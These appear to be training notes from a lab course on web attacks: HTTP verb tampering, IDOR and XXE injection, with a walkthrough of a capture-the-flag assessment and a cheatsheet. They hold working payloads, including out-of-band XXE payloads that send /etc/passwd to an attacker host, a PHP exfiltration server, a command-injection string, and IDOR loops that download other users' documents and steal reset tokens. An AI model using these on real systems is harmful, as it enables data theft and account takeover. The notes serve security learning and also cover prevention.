# Web Attacks — Complete Module Notes

> A practical reference for HTTP Verb Tampering, IDOR, and XXE Injection.
> Includes concepts, exploitation techniques, prevention, and a full skills assessment walkthrough.

---

## Table of Contents

1. [Introduction to Web Attacks](#1-introduction-to-web-attacks)
2. [HTTP Verb Tampering](#2-http-verb-tampering)
   - 2.1 [Bypassing Basic Authentication](#21-bypassing-basic-authentication)
   - 2.2 [Bypassing Security Filters](#22-bypassing-security-filters)
   - 2.3 [Prevention](#23-verb-tampering-prevention)
3. [IDOR — Insecure Direct Object References](#3-idor--insecure-direct-object-references)
   - 3.1 [Intro to IDOR](#31-intro-to-idor)
   - 3.2 [Identifying IDORs](#32-identifying-idors)
   - 3.3 [Mass Enumeration](#33-mass-idor-enumeration)
   - 3.4 [Bypassing Encoded References](#34-bypassing-encoded-references)
   - 3.5 [IDOR in Insecure APIs](#35-idor-in-insecure-apis)
   - 3.6 [Chaining IDOR Vulnerabilities](#36-chaining-idor-vulnerabilities)
   - 3.7 [Prevention](#37-idor-prevention)
4. [XXE — XML External Entity Injection](#4-xxe--xml-external-entity-injection)
   - 4.1 [Intro to XXE](#41-intro-to-xxe)
   - 4.2 [Advanced File Disclosure](#42-advanced-file-disclosure)
   - 4.3 [Blind Data Exfiltration](#43-blind-data-exfiltration)
   - 4.4 [Prevention](#44-xxe-prevention)
5. [Skills Assessment — Full Walkthrough](#5-skills-assessment--full-walkthrough)
6. [Bug Bounty & Real-World Applicability](#6-bug-bounty--real-world-applicability)
7. [Quick Reference Cheatsheet](#7-quick-reference-cheatsheet)

---

## 1. Introduction to Web Attacks

### Why Web Attacks Matter
- Web apps are business-critical → large attack surface.
- Web attacks are among the **most common** types of attacks against companies.
- Attacking an external web app can lead to:
  - Internal network compromise
  - Stolen assets / disrupted services
  - Financial disaster

### Three Attacks Covered in This Module

| Attack | Core Idea | Impact |
|--------|-----------|--------|
| **HTTP Verb Tampering** | Abuse unexpected HTTP methods | Bypass auth / security filters |
| **IDOR** | Guess/calculate object references | Read/modify other users' data |
| **XXE** | Malicious XML with external entities | File disclosure, SSRF, RCE |

---

## 2. HTTP Verb Tampering

### Concept
Exploits web servers that accept many HTTP verbs (GET, POST, HEAD, PUT, DELETE, PATCH, OPTIONS...).
Two root causes:

| Type | Cause | Difficulty to fix |
|------|-------|-------------------|
| **Insecure Configuration** | Server config protects only some methods | Easy |
| **Insecure Coding** | App code filters only some methods | Hard |

---

### 2.1 Bypassing Basic Authentication

**Scenario:** `/admin/reset.php` is protected by HTTP Basic Auth.

#### Identify
1. Try the normal request — you get `401 Unauthorized`.
2. Send an `OPTIONS` request to enumerate allowed methods:

```bash
curl -i -X OPTIONS http://TARGET/
# Look for: Allow: POST,OPTIONS,HEAD,GET
```

#### Exploit
In Burp Suite: Change Request Method to HEAD, or in curl:

```bash
curl -I http://TARGET/admin/reset.php
# If it returns 200 instead of 401, the reset executes
```

If HEAD is also protected, loop through methods:

```bash
for method in GET POST HEAD PUT DELETE PATCH OPTIONS; do
  echo -n "$method: "
  curl -s -o /dev/null -w "%{http_code}\n" -X $method http://TARGET/admin/reset.php
done
# Any 200 response = bypass
```

#### Why It Works
- Basic Auth is often restricted to GET and POST only.
- HEAD is identical to GET but returns no body.
- The reset logic still executes.

---

### 2.2 Bypassing Security Filters

**Scenario:** A filter blocks malicious input (e.g., injection attempts).

#### Exploit
The filter only checks one HTTP method (usually POST), but the app still processes input from other methods.

```bash
# Filter blocks this:
curl "http://TARGET/?filename=test;"

# Bypass with POST:
curl -X POST http://TARGET/ --data-urlencode "filename=file; cp /flag.txt ./"
```

#### Command Injection Example


#### Why It Works
- Filter checks `$_POST['filename']` but logic uses `$_REQUEST['filename']` (covers GET too).
- Changing the method avoids the filter but still reaches the vulnerable code.

---

### 2.3 Verb Tampering Prevention

#### Insecure Configuration Fixes

Vulnerable (Apache):
```xml
<Limit GET>
    Require valid-user
</Limit>
```

Secure:
```xml
# Use LimitExcept — covers all except the listed methods
<LimitExcept HEAD OPTIONS>
    Require valid-user
</LimitExcept>
```

| Server | Safe Keyword |
|--------|-------------|
| Apache | `LimitExcept` |
| Tomcat | `http-method-omission` |
| ASP.NET | `add` / `remove` |

- Disable HEAD unless explicitly required.

#### Insecure Coding Fixes
- Use the same HTTP method for filtering and execution.
- Cover all parameters via the all-methods variable:

| Language | All-Methods Variable |
|----------|---------------------|
| PHP | `$_REQUEST['param']` |
| Java | `request.getParameter('param')` |
| C# | `Request['param']` |

---

## 3. IDOR — Insecure Direct Object References

### 3.1 Intro to IDOR

**Definition:** Direct object reference + missing back-end access control.

- Exposing `?uid=123` alone is not a bug.
- Missing access control lets anyone access any object.

#### Impact
- **Information Disclosure** — read private files/data
- **Data Modification / Deletion** — tamper with other users
- **Privilege Escalation** — access admin functions as a normal user

#### Why It's Common
- Access control is hard to build and automate.
- Found in Facebook, Instagram, Twitter, etc.

---

### 3.2 Identifying IDORs

#### Where to Look
- URL parameters (`?uid=1`, `?id=123`, `?filename=file_1.pdf`)
- API endpoints (`/api/user/1`)
- HTTP headers, cookies
- JavaScript AJAX calls (front-end code)
- Hidden parameters

#### Techniques

**1. Increment / fuzz values:**
```bash
for i in {1..100}; do
  curl -s "http://TARGET/api/user/$i"
done
```

**2. Inspect JavaScript for hidden AJAX calls:**
```javascript
$.ajax({
  url: "change_password.php",
  data: {uid: user.uid, is_admin: is_admin}
});
```

**3. Decode encoded references:**
- Base64: `ZmlsZV8xMjMucGRm` → `file_123.pdf`
- MD5 hash: check front-end for `CryptoJS.MD5(...)`

**4. Compare user roles:**
- Register two accounts
- Compare requests between them

---

### 3.3 Mass IDOR Enumeration

#### Static File IDOR
Predictable file names based on user IDs:


#### Parameter-Based IDOR
```bash
# GET-based
curl "http://TARGET/documents.php?uid=3"

# Extract links
curl -s "http://TARGET/documents.php?uid=3" | grep -oP "\/documents.*?.pdf"

# Loop and download all
for i in {1..20}; do
  for link in $(curl -s "http://TARGET/documents.php?uid=$i" | grep -oP "\/documents.*?\.pdf"); do
    wget -q "http://TARGET/$link"
  done
done
```

#### POST-based (when GET returns empty)
```bash
curl -s -X POST http://TARGET/documents.php -d "uid=$i"
```

---

### 3.4 Bypassing Encoded References

**Scenario:** Object reference is hashed/encoded (e.g., `?contract=cdd96d3cc73d1dbdaffa03cc6cd7339b`).

#### Function Disclosure
Look at the front-end JS:
```javascript
function downloadContract(uid) {
    $.redirect("/download.php", {
        contract: CryptoJS.MD5(btoa(uid)).toString(),
    }, "POST", "_self");
}
```
Reversed algorithm: `MD5(Base64(uid))`

#### Verify
```bash
echo -n 1 | base64 -w 0 | md5sum
# cdd96d3cc73d1dbdaffa03cc6cd7339b → matches!
```

#### Mass Enumeration Script
```bash
#!/bin/bash
for i in {1..20}; do
    hash=$(echo -n $i | base64 -w 0 | md5sum | tr -d ' -')
    curl -sOJ -X POST -d "contract=$hash" http://TARGET/download.php
done
```

---

### 3.5 IDOR in Insecure APIs

#### Insecure Function Calls
Endpoint allows modifying resources via API.

Example PUT request:
```json
{
    "uid": 1,
    "uuid": "40f5888b67c748df7efba008e7c2f9d2",
    "role": "employee",
    "full_name": "Amy Lindon",
    "email": "a_lindon@employees.htb"
}
```

#### Red Flags
- `role` sent as a client-controlled value
- `role` stored in a cookie (`Cookie: role=employee`)
- Hidden `uuid` parameter

#### Common Blocks (and how to bypass)

| Attempt | Blocked By | Bypass |
|---------|-----------|--------|
| Change own uid | uid-vs-endpoint check | Use target endpoint |
| Change another user | uuid mismatch | Leak uuid via GET IDOR |
| Create/Delete user | Role check | Escalate role first |
| Set `role=admin` | Invalid role name | Enumerate users to find valid role |

---

### 3.6 Chaining IDOR Vulnerabilities

#### The Chain
1. `GET /profile/api.php/profile/<uid>` → leak other users' `uuid` and `role`
2. Enumerate all users → find admin (e.g., `role: web_admin`, flag in `about`)
3. `PUT` own profile → change `role` to `web_admin`
4. Now can `POST`/`DELETE` users → full admin control

#### Impact
- Account takeover (change email → password reset)
- XSS injection via profile fields
- Mass assignment across all users

---

### 3.7 IDOR Prevention

#### 1. Object-Level Access Control
- Use RBAC mapped to objects.
- Derive roles from back-end session, never client input.

Example (safe pattern):

- Generate on the back-end when the object is created.
- Store UUID → object mapping in the DB.

#### Checklist

| Area | Action |
|------|--------|
| Access Control | Enforce ownership on every request |
| Roles | Derive from session, never client |
| Object IDs | Use UUID v4 / salted hashes |
| Hashing | Generate server-side, store in DB |
| Cookies | Never trust `role=...` from client |

---

## 4. XXE — XML External Entity Injection

### 4.1 Intro to XXE

**Definition:** User-controlled XML + unsafe parsing = malicious entity resolution.

#### XML Basics
```xml
<?xml version="1.0" encoding="UTF-8"?>
<email>
  <date>01-01-2022</date>
  <sender>john@example.com</sender>
  <body>Hello</body>
</email>
```

| Term | Definition | Example |
|------|-----------|---------|
| Tag | Keys | `<date>` |
| Entity | XML variables | `&lt;` |
| Element | Tag + value | `<date>2022</date>` |
| Attribute | Tag specs | `version="1.0"` |
| Declaration | First line | `<?xml ...?>` |

#### XML DTD
```xml
<!DOCTYPE email [
  <!ELEMENT email (date, sender, body)>
  <!ELEMENT date (#PCDATA)>
  ...
]>
```

#### XML Entities
- **Internal:** `<!ENTITY company "Inlane Freight">` → use `&company;`
- **External (dangerous):**
```xml
<!ENTITY xxe SYSTEM "file:///etc/passwd">
<!ENTITY xxe SYSTEM "http://attacker.com/">
```

---

### 4.2 Advanced File Disclosure

#### CDATA Exfiltration (best for PHP source)
Why: CDATA treats content as raw data (any characters allowed).

**1. Create `xxe.dtd`:**
```xml
<!ENTITY joined "%begin;%file;%end;">
```

**2. Host it:**
```bash
python3 -m http.server 8000
```

**3. Send payload:**
```xml
<!DOCTYPE email [
  <!ENTITY % begin "<![CDATA[">
  <!ENTITY % file SYSTEM "file:///var/www/html/submitDetails.php">
  <!ENTITY % end "]]>">
  <!ENTITY % xxe SYSTEM "http://OUR_IP:8000/xxe.dtd">
  %xxe;
]>
<email>&joined;</email>
```

#### Error-Based XXE
When: App has no output but shows errors.

**DTD:**
```xml
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % error "<!ENTITY content SYSTEM '%nonExistingEntity;/%file;'>">
```

**Payload:**
```xml
<!DOCTYPE email [
  <!ENTITY % remote SYSTEM "http://OUR_IP:8000/xxe.dtd">
  %remote;
  %error;
]>
```
The error message leaks the file content.

---

### 4.3 Blind Data Exfiltration

When: No output, no errors → Out-of-Band (OOB) attack.

#### Manual OOB

**1. `xxe.dtd`:**
```xml
<!ENTITY % file SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">
<!ENTITY % oob "<!ENTITY content SYSTEM 'http://OUR_IP:8000/?content=%file;'>">
```

**2. `index.php` (exfil server):**
```php
<?php
if(isset($_GET['content'])){
    error_log("\n\n" . base64_decode($_GET['content']));
}
?>
```

**3. Start server:**
```bash
php -S 0.0.0.0:8000
```

**4. Send payload:**
```xml
<!DOCTYPE email [
  <!ENTITY % remote SYSTEM "http://OUR_IP:8000/xxe.dtd">
  %remote;
  %oob;
]>
<root>&content;</root>
```

**5.** Decode base64 from the server log.

#### Automated Tool: XXEinjector
```bash
git clone https://github.com/enjoiz/XXEinjector.git

ruby XXEinjector.rb \
  --host=YOUR_IP --httpport=8000 \
  --file=/tmp/xxe.req \
  --path=/etc/passwd \
  --oob=http --phpfilter

cat Logs/TARGET_IP/etc/passwd.log
```

---

### 4.4 XXE Prevention

#### 1. Avoid Outdated Components
- Update XML libraries (libxml, Xerces, etc.)
- Update SOAP, SVG, PDF, DOCX parsers
- PHP: `libxml_disable_entity_loader()` is deprecated since PHP 8.0

#### 2. Safe XML Configurations

| Setting | Purpose |
|---------|---------|
| Disable custom DTDs | Block external DTD refs |
| Disable external entities | Block SYSTEM/PUBLIC |
| Disable parameter entities | Block `%entity;` |
| Disable XInclude | Prevent file inclusion |
| Prevent entity loops | Block DOS |

#### 3. Also Important
- Proper exception handling (don't leak file contents)
- Disable runtime errors in production
- Consider JSON/YAML instead of XML
- Prefer REST over SOAP

#### 4. WAF as Extra Layer
- WAFs can block many XXE payloads
- Never rely on WAFs alone — they can be bypassed

---

## 5. Skills Assessment — Full Walkthrough

**Target:** Social networking web app.  
**Credentials:** `htb-student` / `Academy_student!`

### Attack Chain

#### Stage 1 — Login
```bash
curl -s -i -c cookies.txt -X POST http://TARGET/index.php \
  --data-urlencode 'username=htb-student' \
  --data-urlencode 'password=Academy_student!'
# Set-Cookie: uid=74
```

#### Stage 2 — IDOR: Enumerate Users
Profile page fetches from `/api.php/user/<uid>`:
```bash
for i in $(seq 1 100); do
  curl -s -b cookies.txt "http://TARGET/api.php/user/$i"
done
# Found: uid=52 → company="Administrator"
```

#### Stage 3 — IDOR: Steal Admin Token
Settings uses `/api.php/token/<uid>`:
```bash
curl -s -b cookies.txt http://TARGET/api.php/token/52
# {"token":"e51a85fa-..."}
```

#### Stage 4 — Verb Tampering: Bypass Reset
Change cookie to `uid=52`, then send GET (POST was blocked):
```bash
sed 's/\t74$/\t52/' cookies.txt > admin_cookies.txt

# POST → Access Denied
curl -s -b admin_cookies.txt -X POST http://TARGET/reset.php \
  -d "uid=52&token=$TOKEN&password=NewPass123%21"

# GET → Success
curl -s -b admin_cookies.txt \
  "http://TARGET/reset.php?uid=52&token=$TOKEN&password=NewPass123%21"
```

#### Stage 5 — Login as Admin
```bash
curl -s -i -c admin_login.txt -X POST http://TARGET/index.php \
  --data-urlencode 'username=a.corrales' \
  --data-urlencode 'password=NewPass123!'
# Set-Cookie: uid=52
```

#### Stage 6 — XXE: Read the Flag
Admin gets new "ADD EVENT" feature (`/event.php` → `/addEvent.php`):
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE root [<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=/flag.php">]>
<root>
<name>&xxe;</name>
<details>test</details>
<date>2025-01-01</date>
</root>
```

```bash
curl -s -b admin_login.txt -X POST http://TARGET/addEvent.php \
  -H "Content-Type: application/xml" \
  --data-binary @xxe_event.xml
# Event 'PD9waHAg...' has been created.

echo "PD9waHAgJGZsYWcgPSAiSFRCe200NTczcl93M2JfNDc3NGNrM3J9IjsgPz4K" | base64 -d
# <?php $flag = "HTB{m4573r_w3b_4774ck3r}"; ?>
```

### Chain Summary

| Stage | Technique | Result |
|-------|-----------|--------|
| 1 | Login | `uid=74` |
| 2 | IDOR (user) | Found admin `uid=52` |
| 3 | IDOR (token) | Got admin reset token |
| 4 | Verb Tampering | POST→GET bypass on `reset.php` |
| 5 | Login as admin | `uid=52` |
| 6 | XXE | Read `/flag.php` via `php://filter` |

**Flag:** `HTB{m4573r_w3b_4774ck3r}`

---

## 6. Bug Bounty & Real-World Applicability

### XXE

| Aspect | Reality |
|--------|---------|
| Payout | $500 – $20,000+ (RCE) |
| Common in | SOAP, SAML, SVG, DOCX, legacy enterprise |
| Rarer now due to | Modern frameworks disable external entities by default; JSON replaced XML |

### HTTP Verb Tampering

| Aspect | Reality |
|--------|---------|
| Payout | $200 – $3,000 |
| Common in | Old apps, WAF-bypass scenarios |
| Severity | Low-Medium (rarely headline alone) |

### IDOR

| Aspect | Reality |
|--------|---------|
| Payout | $500 – $30,000+ |
| Frequency | Highest |
| Impact | PII leak, ATO, privilege escalation |
| Famous cases | Facebook, Instagram, Twitter, First American (885M records) |

### Lab vs Real World

| Lab | Real World |
|-----|-----------|
| Direct refs (`uid=1`) | UUIDs, hashes |
| No rate limiting | WAFs, CAPTCHAs |
| Verbose errors | Generic errors |
| Flag as proof | Impact demonstration needed |

### Honest Assessment
- ✅ IDOR is the highest ROI skill for bug bounty.
- ✅ XXE is still valid in enterprise/SAML/legacy.
- ✅ Verb Tampering is a useful trick in your kit, not a primary attack.
- ✅ Chaining is what earns money — combining small bugs into big impact.

---

## 7. Quick Reference Cheatsheet

### HTTP Verb Tampering
```bash
# Enumerate methods
curl -i -X OPTIONS http://TARGET/

# Test all methods for auth bypass
for m in GET POST HEAD PUT DELETE PATCH OPTIONS; do
  echo -n "$m: "
  curl -s -o /dev/null -w "%{http_code}\n" -X $m http://TARGET/endpoint
done

# Bypass filter by switching method
curl -X POST http://TARGET/ --data-urlencode "param=payload"
```

### IDOR
```bash
# Enumerate users
for i in $(seq 1 100); do
  curl -s -b cookies.txt "http://TARGET/api/user/$i"
done

# Mass download (param-based)
for i in $(seq 1 20); do
  curl -s "http://TARGET/doc.php?uid=$i" | grep -oP '/documents/.*?\.pdf'
done | while read f; do wget -q "http://TARGET$f"; done

# Bypass hashed reference
h=$(echo -n $i | base64 -w 0 | md5sum | tr -d ' -')
curl -sOJ -X POST -d "contract=$h" http://TARGET/download.php
```

### XXE
```bash
# Basic file read
cat > p.xml << 'EOF'
<?xml version="1.0"?>
<!DOCTYPE root [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<root><name>&xxe;</name></root>
EOF
curl -X POST http://TARGET/endpoint -H "Content-Type: application/xml" --data-binary @p.xml

# CDATA / Advanced file read
echo '<!ENTITY joined "%begin;%file;%end;">' > xxe.dtd
python3 -m http.server 8000  # separate terminal

cat > p.xml << 'EOF'
<?xml version="1.0"?>
<!DOCTYPE email [
  <!ENTITY % begin "<![CDATA[">
  <!ENTITY % file SYSTEM "php://filter/convert.base64-encode/resource=/flag.php">
  <!ENTITY % end "]]>">
  <!ENTITY % xxe SYSTEM "http://YOUR_IP:8000/xxe.dtd">
  %xxe;
]>
<root><name>&joined;</name></root>
EOF
curl -X POST http://TARGET/endpoint -H "Content-Type: application/xml" --data-binary @p.xml

# Blind OOB
cat > xxe.dtd << 'EOF'
<!ENTITY % file SYSTEM "php://filter/convert.base64-encode/resource=/flag.php">
<!ENTITY % oob "<!ENTITY content SYSTEM 'http://YOUR_IP:8000/?content=%file;'>">
EOF

cat > index.php << 'EOF'
<?php if(isset($_GET['content'])){error_log("\n\n".base64_decode($_GET['content']));} ?>
EOF
php -S 0.0.0.0:8000

cat > p.xml << 'EOF'
<!DOCTYPE email [
  <!ENTITY % remote SYSTEM "http://YOUR_IP:8000/xxe.dtd">
  %remote;%oob;
]>
<root>&content;</root>
EOF
curl -X POST http://TARGET/endpoint -H "Content-Type: application/xml" --data-binary @p.xml
# Decode base64 from PHP server log
```

### Useful Shell Tips
```bash
# Disable bash history expansion (so ! works in passwords)
set +H

# Read cookies file
cat cookies.txt

# Swap uid in cookie jar
sed 's/\t74$/\t52/' cookies.txt > admin.txt

# Decode base64
echo "BASE64" | base64 -d
```

---

## Key Takeaways

- **HTTP Verb Tampering** = bypass via unexpected methods. Fix by covering all methods and using safe keywords (`LimitExcept`).
- **IDOR** = broken access control + direct references. Fix with RBAC + UUIDs.
- **XXE** = unsafe XML parsing. Fix by disabling external entities + updating libraries.
- **Chain attacks** — IDOR leak → Verb Tampering bypass → XXE file read = full compromise.
- **Never trust client-side data** — roles, IDs, and hashes must be validated server-side.
